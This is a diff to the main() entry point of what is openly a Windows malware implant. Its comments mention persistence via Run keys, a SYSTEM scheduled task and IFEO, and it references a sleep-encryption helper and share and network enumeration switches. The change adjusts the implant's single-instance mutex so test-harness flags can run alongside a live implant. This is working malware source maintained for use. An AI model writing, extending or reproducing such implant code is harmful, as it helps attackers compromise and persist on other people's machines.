@@ -6681,14 +6681,32 @@ int main(int argc, char* argv[]) {
     if (argc >= 6 && strcmp(argv[1], "--sleep-helper") == 0)
         return vex::sleepcrypt::HelperMain(argc, argv);
 
+    // Harness-only invocations must still work while a real implant is
+    // holding the single-instance mutex.
+    bool harnessOnly = false;
+    for (int i = 1; i < argc; ++i) {
+        const char* a = argv[i];
+        if (!strcmp(a, "--safe") || !strcmp(a, "--persist-preview") ||
+            !strcmp(a, "--selftest") || !strcmp(a, "--shares") ||
+            !strcmp(a, "--net-enum")) {
+            harnessOnly = true;
+            break;
+        }
+    }
+
     // One implant instance per host. Persistence can start us from Run keys,
     // a SYSTEM task and IFEO; concurrent writers corrupt the journal.
-    HANDLE instanceMutex = CreateMutexW(NULL, TRUE, L"Global\\VexPayloadInstance");
-    if (!instanceMutex)
-        instanceMutex = CreateMutexW(NULL, TRUE, L"Local\\VexPayloadInstance");
-    if (instanceMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
-        CloseHandle(instanceMutex);
-        return 0;
+    // Reset the thread error first: a stale ERROR_ALREADY_EXISTS from CRT
+    // startup must not make a fresh harness run look like a second instance.
+    if (!harnessOnly) {
+        SetLastError(ERROR_SUCCESS);
+        HANDLE instanceMutex = CreateMutexW(NULL, TRUE, L"Global\\VexPayloadInstance");
+        if (!instanceMutex)
+            instanceMutex = CreateMutexW(NULL, TRUE, L"Local\\VexPayloadInstance");
+        if (instanceMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
+            CloseHandle(instanceMutex);
+            return 0;
+        }
     }
 
     // Runtime switches, for VM work only. Production runs ignore them.
